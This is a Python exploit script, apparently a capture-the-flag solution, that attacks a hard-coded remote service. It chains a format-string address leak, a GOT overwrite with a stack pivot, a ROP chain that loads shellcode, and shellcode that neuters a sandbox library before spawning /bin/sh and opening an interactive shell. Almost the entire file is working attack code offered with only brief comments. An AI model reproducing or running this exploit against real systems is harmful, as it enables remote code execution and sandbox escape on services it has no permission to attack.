#!/usr/bin/env python2.7
import socket
import struct
import os
import telnetlib

ADDR = "202.112.28.116"
PORT = 10910

sockfd = socket.create_connection((ADDR, PORT))

def rtil_str(s, st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    return buf

uname = "guest"
pw = "guest123"

rtil_str(sockfd, ": ")
sockfd.send(uname + "\n")
rtil_str(sockfd, ": ")
sockfd.send(pw + "\n")

rtil_str(sockfd, ": ")
sockfd.send("2\n")
rtil_str(sockfd, ":\n")
sockfd.send("A" * 256 + "\n")
rtil_str(sockfd, ": ")


"""
    We use the first format string to leak stuff
"""
fmtstr1 = "AAAAAAAA" + "%79$p" + "%p"
sockfd.send("4\n")
rtil_str(sockfd, ": ")
sockfd.send(fmtstr1 + "\n")
rtil_str(sockfd, ": ")
sockfd.send("\n")
buf = rtil_str(sockfd, ": ")

# libc dependent offsets
base_off, add_esp_off, off, lc_start_main_off, prdx_off, prsi_off, prdi_off, read_off, puts_off = (245, 0xf1d1a, 0x39c268, 0x21dd0, 0x116cd2, 0x1651e6, 0x165e06, 0xeb800, 0x6fe30)

# interesting addresses
libc_start_main = buf.split("0x")[1].split()[0]
libc_start_main = int(libc_start_main, 16) - base_off
text_base = buf.split("0x")[2].split()[0]
text_base = int(text_base, 16) - 0x1490

tls_getaddr_got = libc_start_main + off
libc_base = libc_start_main  - lc_start_main_off
add_esp = libc_base + add_esp_off
prdi = libc_base + prdi_off
prdx = libc_base + prdx_off
prsi = libc_base + prsi_off
puts_addr = libc_base + puts_off
read_addr = libc_base + read_off
rwx_page = 0x304b11000                          # store shellcode here
dt_debug_entry = 0x304a7e4b8                    # address of dt_debug in .dynamic section of pinbin

print "[+] Address of .text: %s [+]"%(hex(text_base))
print "[+] Address of libc: %s [+]"%(hex(libc_base))
print "[+] Address of libc_start_main: %s [+]"%(hex(libc_start_main))
print "[+] Address of tls_getaddr_got: %s [+]"%(hex(tls_getaddr_got))

# shellcode
sb_listend_off = 0xA523E8
sb_entrylist_off = 0xA523E0

scdata = \
"""
; simple hello world in nasm
USE64
DEFAULT REL

%%define puts %s
    section .data

_start:
    mov r10, %s             ; address of dt_debug_entry
    mov r10, [r10]          ; get address of r_debug
    mov r10, [r10 + 0x8]    ; get address of r_map

    ; traverse list to find sandbox.so
    mov r10, [r10 + 0x18]   ; skip first which seems to be always 0
trav:
    mov rdi, [r10 + 0x8]    ; l_name
    mov r9, [r10]           ; l_addr
    mov r8, puts
    call r8                 ; print the loaded objects names (for debugging)
    mov r10, [r10 + 0x18]
    test r10, r10
    jnz trav
found:

    xor rbx, rbx
    mov rdi, r9
    mov rsi, r9
    add rdi, %s         ; listend
    add rsi, %s         ; entrylist
    mov [rdi], rbx
    mov [rsi], rbx

    jmp shell

binsh:
    db "/bin/sh"
end:
    nop

shell:
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    xor rcx, rcx    
    mov al, 0x10
    shl rax, 0x8
    sub rsp, rax
    xor rax, rax

execve:
    xor rax, rax
    mov [end], al           ; put null byte in place
    lea rdi, [binsh]
    mov qword [rsp], rdi
    mov qword [rsp + 8], rax
    mov rsi, rsp
    mov rdx, rax
    mov al, 59
    syscall

exit:
    mov rax, 60
    mov rdi, 0
    syscall

"""%(hex(puts_addr), hex(dt_debug_entry), hex(sb_listend_off), hex(sb_entrylist_off))

# build shellcode
fp = open("sc.asm", "w")
fp.write(scdata)
fp.close()
os.system("nasm sc.asm -o sc.bin")
sc = open("sc.bin", "r").read()

"""
    We use the second format string to overwrite the GOT entry of tls_get_addr in libc
    with a gadget that pivots the stack to data we control and rop to read the shellcode
"""
target_addr = add_esp
target_addr_upper = target_addr & 0xffff
target_addr_lower = (target_addr >> 16) & 0xffff

if target_addr_upper > target_addr_lower:
    target_addr_upper = target_addr_lower - target_addr_upper
else:
    target_addr_upper += 0xffff - target_addr_lower + 1

fmtstr2 = "%" + str(target_addr_lower).rjust(8, "0") + "u%40$hn" 
pad = "A" * 8
fmtstr2 += "%" + str(target_addr_upper).rjust(8, "0") + "u%13$hn" + pad + struct.pack("<Q", tls_getaddr_got)
fmtpw2 = struct.pack("<Q", tls_getaddr_got + 2)
fmtpw2 += struct.pack("<Q", 0x5a) * 5
fmtpw2 += struct.pack("<Q", prdi) + struct.pack("<Q", 0x0)
fmtpw2 += struct.pack("<Q", prsi) + struct.pack("<Q", rwx_page)
fmtpw2 += struct.pack("<Q", prdx) + struct.pack("<Q", len(sc))
fmtpw2 += struct.pack("<Q", read_addr)
fmtpw2 += struct.pack("<Q", rwx_page)

sockfd.send(fmtstr2 + "\n")
rtil_str(sockfd, ": ")
sockfd.send(fmtpw2 + "\n")
buf = rtil_str(sockfd, "System shutdown.")
sockfd.send(sc)

t = telnetlib.Telnet()
t.sock = sockfd
t.interact()

os.unlink("sc.bin")
os.unlink("sc.asm")
